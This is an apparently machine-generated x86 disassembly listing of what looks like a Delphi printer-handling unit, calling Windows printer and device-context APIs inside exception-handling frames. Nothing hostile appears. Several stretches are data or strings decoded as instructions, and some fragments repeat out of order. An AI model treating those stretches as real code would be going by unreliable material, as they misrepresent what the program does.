mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x10 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403294
retn
mov eax [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_4234a4
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
sub_424724
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_424809
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test esi esi
je r-xdata
mov eax [ edi + 0x18 ]
mov eax [ eax + 0x8 ]
test eax eax
jle r-xdata
lea eax [ edi + 0x24 ]
mov edx esi
call sub_4040a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424810
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404acc
lea eax [ ebp - 0x8 ]
call sub_40568c
retn
dec eax
jne r-xdata
xor edx edx
mov eax [ edi + 0x18 ]
call sub_4234a4
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4056a4
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4056d0
mov eax [ ebp - 0x10 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
xor edx edx
mov eax [ edi + 0x18 ]
call sub_4234a4
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4056a4
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4056d0
mov eax [ ebp - 0xc ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
jmp r-xdata
sub_424a40
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_424b33
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx [ ebp - 0x8 ]
call sub_4040a4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b64c
call sub_403a08
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424b3a
lea eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404acc
lea eax [ ebp - 0x10 ]
call sub_40568c
retn
inc ebx
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec ebx
jne r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_4056d0
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ esi + 0x14 ]
call sub_4234a4
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x10 ]
call sub_4056a4
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_4056d0
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x38 ]
test al al
je r-xdata
sub_424b58
inc ebx
mov eax eax
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_424c37
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_4040a4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b64c
call sub_403a08
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424c3e
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404acc
lea eax [ ebp - 0x8 ]
call sub_40568c
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4056d0
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_4234a4
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4056a4
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4056d0
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_424c58
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_405700
xor eax eax
push ebp
push sub_424ca7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
call sub_4056a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424cae
lea eax [ ebp - 0x4 ]
call sub_40568c
retn
lea eax [ ebx + 0xc ]
call sub_40568c
sub_424cb4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_404500
xor eax eax
push ebp
push sub_424d49
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
dec ax
je r-xdata
lea eax [ ebx + 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_4040a4
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_424a40
jmp r-xdata
dec ax
je r-xdata
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424d50
lea eax [ ebp - 0x4 ]
call sub_404050
retn
mov eax ebx
call sub_424554
jmp r-xdata
dec ax
je r-xdata
mov eax ebx
call sub_424584
jmp r-xdata
jmp r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_424724
sub_424d74
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_4234a4
cmp edi [ eax + 0x8 ]
jne r-xdata
mov eax [ esi + 0x18 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_4234a4
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_414060
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_4234a4
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_414060
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_414060
sub_424e00
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov eax esi
call sub_424514
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x18 ]
call sub_403294
mov eax [ esi + 0x14 ]
call sub_403294
mov eax [ esi + 0x10 ]
call sub_403294
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403284
test bl bl
jle r-xdata
lea eax [ esi + 0xc ]
call sub_40568c
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_424e54
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_424e8b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424e92
retn
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
sub_424ebc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_424ee1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424ee8
retn
sub_424ef8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
dec edi
inc edx
add [ eax + eax ] cl
add [ eax ] al
je r-xdata
outsb
je r-xdata
inc eax
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45080040 ] al
push eax
jb r-xdata
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec edi
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov dh 0x50
inc edx
add [ eax ] dl
outsb
je r-xdata
adc bl ch
add [ edx - 0x80 ] eax
cmp ah [ eax ]
mov eax eax
loopne r-xdata
mov eax esi
pop esi
retn
mov edx [ eax ]
jmp r-xdata
inc edx
add [ eax ] dh
add [ eax ] al
add [ eax - 0x3bffbff0 ] bh
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add al ch
push ecx
inc edx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl dh
dec edi
jb r-xdata
retn 0x8
outsb
je r-xdata
add [ eax ] al
add [ eax - 0x3bffbff0 ] bh
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0xe0040 ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
add al 0x0
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
or [ eax ] al
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
or al 0x0
add [ eax ] al
push cs
push esp
push eax
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x10004250 ] dh
jb r-xdata
je r-xdata
inc edx
mov esi edx
jmp r-xdata
add [ ecx ] al
add [ eax ] al
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
dec edi
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ edx ] 0x20
pop ecx
mov [ fs : eax ] edx
push sub_424ee8
retn
inc eax
add [ eax + 0x4f ] dl
inc edx
add [ ebx ] al
adc edx [ eax + edx * 2 + 0x72 ]
imul ebp [ esi + 0x74 ] 0x724f7265
imul esp [ ebp + 0x6e ] 0x69746174
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ edi + ecx * 2 + 0x42 ] cl
add [ edx ] cl
jo r-xdata
pop ebp
jb r-xdata
imul ebp [ esi + 0x74 ] 0x8b737265
shl al 0x4f
mov cl [ edx ]
test cl cl
je r-xdata
add [ eax ] al
or [ eax + edx * 2 + 0x72 ] dl
imul ebp [ esi + 0x74 ] 0x56907265
mov esi [ eax ]
cmp [ eax ] 0x0
je r-xdata
add [ eax ] al
add [ eax ] eax
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
push eax
outsd
jb r-xdata
call sub_404248
mov eax edi
test bl bl
je r-xdata
jbe r-xdata
cmp [ edx ] 0x2c
jne r-xdata
cmp cl 0x2c
jne r-xdata
add [ eax ] bl
add [ eax ] al
add [ eax ] cl
push esp
push eax
jb r-xdata
mov eax edi
pop edi
pop esi
pop ebx
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
add [ edx ] ch
push ebx
push esi
mov esi ecx
mov ebx eax
xor eax eax
push ebp
push sub_42519b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404248
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x8 ]
call sub_40445c
jne r-xdata
arpl [ ebp - 0x73 ] sp
inc eax
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ eax ] edx
mov [ edx ] 0x0
inc edx
inc edx
add [ eax ] al
add [ eax ] al
call 0xe429232
imul esi [ ebx + ecx + 0x70 ] 0x6e614c6f
jae r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403264
lea eax [ edi + 0x4 ]
mov edx esi
call sub_404248
lea eax [ edi + 0x8 ]
mov edx [ ebp + 0xc ]
call sub_404248
lea eax [ edi + 0xc ]
mov edx [ ebp + 0x8 ]
add esp 0xfffffff0
call sub_4035a0
add [ eax + edx + 0x180040 ] ch
popad
jo r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4251a2
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404074
retn
mov al 0x1
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_404248
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0xc ]
call sub_40445c
je r-xdata
sbb [ eax ] al
or [ eax + 0x72 ] dl
sub_424ffc
push esi
mov esi [ eax ]
cmp [ eax ] 0x0
je r-xdata
mov eax esi
pop esi
retn
mov edx [ eax ]
jmp r-xdata
cmp [ edx ] 0x20
je r-xdata
inc edx
mov esi edx
jmp r-xdata
mov cl [ edx ]
test cl cl
je r-xdata
cmp [ edx ] 0x2c
jne r-xdata
cmp cl 0x2c
jne r-xdata
mov [ eax ] edx
mov [ edx ] 0x0
inc edx
inc edx
sub_42504c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
push eax
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x10004250 ] dh
add [ eax ] al
add [ eax - 0x3bffbff0 ] bh
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0xe0040 ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
add al 0x0
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
or [ eax ] al
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
or al 0x0
add [ eax ] al
push cs
push esp
push eax
jb r-xdata
retn 0x8
outsb
je r-xdata
pop ebp
jb r-xdata
call sub_404248
mov eax edi
test bl bl
je r-xdata
jbe r-xdata
mov eax edi
pop edi
pop esi
pop ebx
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
add [ edx ] ch
push ebx
push esi
mov esi ecx
mov ebx eax
xor eax eax
push ebp
push sub_42519b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404248
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x8 ]
call sub_40445c
jne r-xdata
arpl [ ebp - 0x73 ] sp
inc eax
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
test dl dl
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403264
lea eax [ edi + 0x4 ]
mov edx esi
call sub_404248
lea eax [ edi + 0x8 ]
mov edx [ ebp + 0xc ]
call sub_404248
lea eax [ edi + 0xc ]
mov edx [ ebp + 0x8 ]
add esp 0xfffffff0
call sub_4035a0
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4251a2
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404074
retn
mov al 0x1
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_404248
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0xc ]
call sub_40445c
je r-xdata
sub_4250c8
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403264
lea eax [ edi + 0x4 ]
mov edx esi
call sub_404248
lea eax [ edi + 0x8 ]
mov edx [ ebp + 0xc ]
call sub_404248
lea eax [ edi + 0xc ]
mov edx [ ebp + 0x8 ]
call sub_404248
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_425128
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov ebx eax
xor eax eax
push ebp
push sub_42519b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404248
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x8 ]
call sub_40445c
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4251a2
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404074
retn
mov al 0x1
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_404248
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0xc ]
call sub_40445c
je r-xdata
sub_4251ac
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403264
mov [ esi + 0x14 ] 0xffffffff
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_4251e8
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
cmp [ esi + 0x1c ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_425264
mov eax esi
call sub_425b90
mov eax esi
call sub_425bcc
mov eax [ esi + 0x4 ]
call sub_403294
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
mov eax esi
call sub_425400
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
push eax
call ClosePrinter
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403284
test bl bl
jle r-xdata
push eax
call GlobalUnlock
mov eax [ esi + 0x28 ]
push eax
call GlobalFree
xor eax eax
mov [ esi + 0x28 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_425264
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_425382
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ esi + 0x1f ]
cmp bl al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425389
lea eax [ ebp - 0x8 ]
call sub_404050
retn
xor edi edi
mov edx ebx
sub dl 0x1
jb r-xdata
xor edx edx
mov eax esi
call sub_425390
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
je r-xdata
mov eax [ esi + 0x20 ]
push eax
call DeleteDC
xor eax eax
mov [ esi + 0x20 ] eax
jmp r-xdata
xor edx edx
call sub_41e984
cmp al 0x2
je r-xdata
dec dl
je r-xdata
test edi edi
je r-xdata
mov edi CreateICA
jmp r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
mov [ esi + 0x1f ] bl
mov eax esi
call sub_425738
push eax
mov eax esi
call sub_425750
pop edx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
call sub_404510
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_404510
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_404510
push eax
call edi
mov [ esi + 0x20 ] eax
cmp [ esi + 0x20 ] 0x0
jne r-xdata
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
xor edx edx
call sub_41e984
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405b50
mov eax [ ebp - 0x8 ]
call sub_425030
mov edi CreateDCA
push eax
call DeleteDC
mov edx [ esi + 0x20 ]
call sub_41e984
sub_425390
push ebp
mov ebp esp
push 0x0
push 0x0
xor ecx ecx
push ebp
push sub_4253f5
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp dl [ eax + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4253fc
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404074
retn
test dl dl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405b50
mov eax [ ebp - 0x8 ]
call sub_425030
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b50
mov eax [ ebp - 0x4 ]
call sub_425030
jmp r-xdata
sub_425400
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_425390
mov eax [ ebx + 0x20 ]
push eax
call EndPage
cmp [ ebx + 0x1d ] 0x0
jne r-xdata
mov [ ebx + 0x1c ] 0x0
mov [ ebx + 0x1d ] 0x0
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
mov eax [ ebx + 0x20 ]
push eax
call EndDoc
sub_425434
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_425738
push eax
mov eax ebx
call sub_425750
pop edx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
mov eax [ esi + 0x8 ]
call sub_404510
mov edx eax
mov eax edi
call sub_408644
mov eax [ esi + 0x4 ]
call sub_404510
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_408644
mov eax [ esi + 0xc ]
call sub_404510
mov edx eax
mov eax [ ebp + 0xc ]
call sub_408644
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x28 ]
mov [ eax ] edx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_4254a0
push ebx
push esi
mov esi edx
mov ebx eax
mov al [ r-xdata ]
mov [ ebx + 0x1e ] al
test esi 0x1
je r-xdata
test esi 0x100
je r-xdata
or [ ebx + 0x1e ] 0x2
test esi 0x8000
je r-xdata
or [ ebx + 0x1e ] 0x1
pop esi
pop ebx
retn
or [ ebx + 0x1e ] 0x4
sub_4254dc
push ebp
mov ebp esp
add esp 0xffffff3c
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xb0 ] ebx
mov [ ebp - 0xb4 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_425713
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_425390
mov eax [ ebx + 0x28 ]
cmp esi eax
je r-xdata
mov esi [ ebx + 0x28 ]
test esi esi
je r-xdata
test eax eax
je r-xdata
mov eax ebx
call sub_425bcc
mov eax [ ebx + 0x2c ]
test eax eax
je r-xdata
push esi
call GlobalLock
mov edi eax
mov [ ebx + 0x24 ] edi
mov edx [ edi + 0x28 ]
mov eax ebx
call sub_4254a0
mov [ ebx + 0x28 ] esi
push eax
call GlobalUnlock
mov eax [ ebx + 0x28 ]
push eax
call GlobalFree
xor edx edx
mov eax ebx
call sub_425264
mov [ ebp - 0xc ] 0xffffffff
mov eax ebx
call sub_425750
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
push eax
call ClosePrinter
xor eax eax
mov [ ebx + 0x2c ] eax
cmp [ ebp - 0xc ] 0xffffffff
jne r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0xc ]
mov [ ebx + 0x14 ] eax
push 0x0
lea eax [ ebx + 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call OpenPrinterA
test eax eax
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4250c8
push eax
lea eax [ ebp - 0xb0 ]
push eax
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_405b50
mov eax [ ebp - 0xb4 ]
mov edx [ ebp - 0x4 ]
mov [ ebp - 0xc4 ] edx
mov [ ebp - 0xc0 ] 0x6
mov edx [ ebp + 0xc ]
mov [ ebp - 0xbc ] edx
mov [ ebp - 0xb8 ] 0x6
lea edx [ ebp - 0xc4 ]
mov ecx 0x1
call sub_408d10
mov edx [ ebp - 0xb0 ]
mov eax [ ebx + 0x10 ]
pop ecx
mov esi [ eax ]
call [ esi + 0x3c ]
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0xc
mov edx [ ebp + 0xc ]
call sub_404248
mov [ ebp - 0xc ] esi
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42571a
lea eax [ ebp - 0xb4 ]
mov edx 0x2
call sub_404074
retn
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov edx esi
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_425128
test al al
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0xac ]
push eax
lea eax [ ebp - 0xac ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
push 0x0
call DocumentPropertiesA
push eax
push 0x42
call GlobalAlloc
mov esi eax
mov [ ebx + 0x28 ] esi
test esi esi
je r-xdata
mov eax [ ebx + 0x24 ]
mov edx [ eax + 0x28 ]
mov eax ebx
call sub_4254a0
push esi
call GlobalLock
mov edi eax
mov [ ebx + 0x24 ] edi
push 0x2
push edi
push edi
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
push 0x0
call DocumentPropertiesA
test eax eax
jge r-xdata
mov eax [ ebx + 0x28 ]
push eax
call GlobalUnlock
mov eax [ ebx + 0x28 ]
push eax
call GlobalFree
xor eax eax
mov [ ebx + 0x28 ] eax
sub_425750
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42597f
push [ fs : eax ]
mov [ fs : eax ] esp
